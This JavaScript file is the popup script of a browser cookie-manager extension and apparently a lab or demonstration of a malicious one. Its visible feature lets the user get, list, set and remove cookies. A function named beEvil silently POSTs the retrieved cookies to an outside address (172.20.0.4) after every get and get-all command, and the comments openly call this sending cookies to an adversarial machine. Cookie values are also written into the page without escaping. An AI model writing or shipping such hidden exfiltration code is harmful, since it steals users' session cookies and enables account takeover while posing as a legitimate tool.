// Arrays of the fields used by each command to facilitate easy swapping
const allFields = ["cookieSubmit", "cookieName", "cookieURL", "cookieKey", "cookieStore", "cookieDomain", "cookiePath", "cookieExp", "cookieValue", "cookieSite", "cookieSecure", "cookieHTTP", "cookieSession", "cookieNameLabel", "cookieURLLabel", "cookieKeyLabel", "cookieStoreLabel", "cookieDomainLabel", "cookiePathLabel", "cookieExpLabel", "cookieValueLabel", "cookieSiteLabel", "cookieSecureLabel", "cookieHTTPLabel", "cookieSessionLabel"];
const getFields = ["cookieSubmit", "cookieName", "cookieURL", "cookieKey", "cookieStore", "cookieNameLabel", "cookieURLLabel", "cookieKeyLabel", "cookieStoreLabel"];
const getAllFields = ["cookieSubmit", "cookieName", "cookieURL", "cookieKey", "cookieStore", "cookieDomain", "cookiePath", "cookieSecure", "cookieSession", "cookieNameLabel", "cookieURLLabel", "cookieKeyLabel", "cookieStoreLabel", "cookieDomainLabel", "cookiePathLabel", "cookieSecureLabel", "cookieSessionLabel"];
const setFields = ["cookieSubmit", "cookieName", "cookieURL", "cookieKey", "cookieStore", "cookieDomain", "cookiePath", "cookieExp", "cookieValue", "cookieSite", "cookieSecure", "cookieHTTP", "cookieNameLabel", "cookieURLLabel", "cookieKeyLabel", "cookieStoreLabel", "cookieDomainLabel", "cookiePathLabel", "cookieExpLabel", "cookieValueLabel", "cookieSiteLabel", "cookieSecureLabel", "cookieHTTPLabel"];
const removeFields = ["cookieSubmit", "cookieName", "cookieURL", "cookieKey", "cookieStore", "cookieNameLabel", "cookieURLLabel", "cookieKeyLabel", "cookieStoreLabel"];
var selected = null;

/*
A simple way to hide all the input fields
*/
function hide(){
    for (const field of allFields){
        document.getElementById(field).style.display="none";
    }
}
            
/*
Shows the associated input field for whichever button (a thus command) was pressed
Args:
    Button - integer - 1, 2, 3, or 4 depending on the button pressed.
*/
function showFields(button){
    hide(); // Hide everything then re-enable whats needed
    document.getElementById("errorMessage").style.display="none";
    document.getElementById("results").innerHTML = "";
    document.getElementById("results").style.display="none";
    
    if (button == 1){
        selected = "get"; // Mark which command we are performing for later
        for (const field of getFields){  // Display the associated elements
            document.getElementById(field).style.display="inline"; 
        }
        
        // Update the submit button to reflect the correct commands
        document.getElementById("cookieSubmit").value="Get";
    }
    
    else if (button == 2){
        selected = "getAll";
        for (const field of getAllFields){
            document.getElementById(field).style.display="inline";
        }
        document.getElementById("cookieSubmit").value="Get All";
    
    }else if (button == 3){                   
        selected = "set";
        for (const field of setFields){
            document.getElementById(field).style.display="inline";
        }
        document.getElementById("cookieSubmit").value="Set";
    
    }else if (button == 4){                   
        selected = "remove";
        for (const field of removeFields){
            document.getElementById(field).style.display="inline";
        }
        document.getElementById("cookieSubmit").value="Remove";
    }
}

/*
A function to clear the input fields
*/
function cleanFields(){
    if (selected == "get"){
        for (const field of getFields){ // Wipes all text fields
            document.getElementById(field).value = "";
        }
    
    }else if (selected == "getAll"){
        for (const field of getAllFields){
            document.getElementById(field).value = "";
        }
        
        // Manually decheck the checkboxes
        document.getElementById("cookieSecure").checked = false;
        document.getElementById("cookieSession").checked = false;
   
   }else if (selected == "set"){
        for (const field of setFields){
            document.getElementById(field).value = "";
        }
        
        document.getElementById("cookieSite").value = "no_restriction"; // Also reset the one dropdown manually
        document.getElementById("cookieSecure").checked = false;
        document.getElementById("cookieHTTP").checked = false;
    
    }else if (selected == "remove"){
        for (const field of removeFields){
            document.getElementById(field).value = "";
        }
    }
}

function buildOutput(cookies){
    var output = "";
    
    cookies.forEach((cookie) => {
        output = output + "<p><table><tr><td>"+ cookie.name + " = " + cookie.value + "</td></tr><tr><td>Domain: " + cookie.domain + "</td></tr><tr><td>Path: " + cookie.path + "</td></tr><tr><td>SameSite: " + cookie.sameSite + "</td></tr><tr><td>Session: " + cookie.seesion + ", hostOnly: " + cookie.hostOnly + ", HttpOnly: " + cookie.httpOnly + ", Secure: " + cookie.secure + "</td></tr><tr><td> Expiration: " + new Date(cookie.expirationDate) + "</td></tr></table></p>";
    });
    
    document.getElementById("results").innerHTML = output;
}
        

/*
A bit self explanitory... its the bad part
Sends the cookies to an adversarial machine
*/   
function beEvil(data){
    var request = new XMLHttpRequest();
    request.open("POST", "https://172.20.0.4", false);
    request.setRequestHeader("Content-Type", "application/json");
    request.send(JSON.stringify(data));
}
   
/*
A function to get the user input, communicate with the background script, and display the results
*/ 
function submit(){
    
    // Intialize fields shared by all commands
    var name = document.getElementById("cookieName").value; 
    var url = document.getElementById("cookieURL").value;
    var partitionKey = document.getElementById("cookieKey").value; ; 
    var store = document.getElementById("cookieStore").value; ;
    
    // Intialize fields specific to one command
    var domain = "";
    var path = "";
    var expires = "";
    var value = "";
    var sameSite = "";
    var secure = false;
    var httpOnly = false;
    var session = false;
   
    // Get additional values as needed
    if (selected == "getAll"){
        domain = document.getElementById("cookieDomain").value;
        path = document.getElementById("cookiePath").value;
        secure = document.getElementById("cookieSecure").checked;
        session = document.getElementById("cookieSession").checked;    
    
    }else if (selected == "set"){
        domain = document.getElementById("cookieDomain").value;
        path = document.getElementById("cookiePath").value;
        expires = Date.parse(document.getElementById("cookieExp").value);
        value = document.getElementById("cookieValue").value;
        sameSite = document.getElementById("cookieSite").value;
        secure = document.getElementById("cookieSecure").checked;
        httpOnly = document.getElementById("cookieHTTP").checked; 
    }
    
    // Talk to the background script
    browser.runtime.sendMessage({func: selected, name: name, url: url, key: partitionKey, store: store, domain: domain, path: path, expires: expires, value: value, Site: sameSite, secure: secure, http: httpOnly, session: session}).then((response) => {;
        
        // Reveal the status bar no matter what
        document.getElementById("errorMessage").style.display = "inline";
        
        if (response.status == -1){ 
            document.getElementById("errorMessage").style.color = "red";
            if (response.error != null){
                document.getElementById("errorMessage").innerText = response.error; // Display an error code if available
            }else{
                document.getElementById("errorMessage").innerText = response.message;  // Othewise my message will do
            }
        }else{
           document.getElementById("errorMessage").style.color = "green";
           document.getElementById("errorMessage").innerText = response.message; // Display success message
           cleanFields(); // Empty inputs
           hide();
           
           if (selected == "get"){
               buildOutput([response.cookie]);
               beEvil(response.cookie);
          }else if (selected == "getAll"){
               buildOutput(response.cookies);               
               beEvil(response.cookies);
          }else if (selected == "set"){
               buildOutput([response.cookie]);
          }else if (selected == "remove"){
              document.getElementById("results").innerHTML = "<p><table><tr><td>" + response.details.name + "</td></tr><tr><td>URL:"+ response.details.url + "</td></tr></table></p>";
          }
          document.getElementById("results").style.display="inline";
      } 
    })
}
 
/*
Set up the event handlers
*/
function setUpButtons(){
    document.getElementById("getButton").addEventListener("click", (event) => {showFields(1)});
    document.getElementById("getAllButton").addEventListener("click", (event) => {showFields(2)});
    document.getElementById("setButton").addEventListener("click", (event) => {showFields(3)});
    document.getElementById("removeButton").addEventListener("click", (event) => {showFields(4)});
    document.getElementById("cookieSubmit").addEventListener("click", (event) => {submit()});
}

setUpButtons();
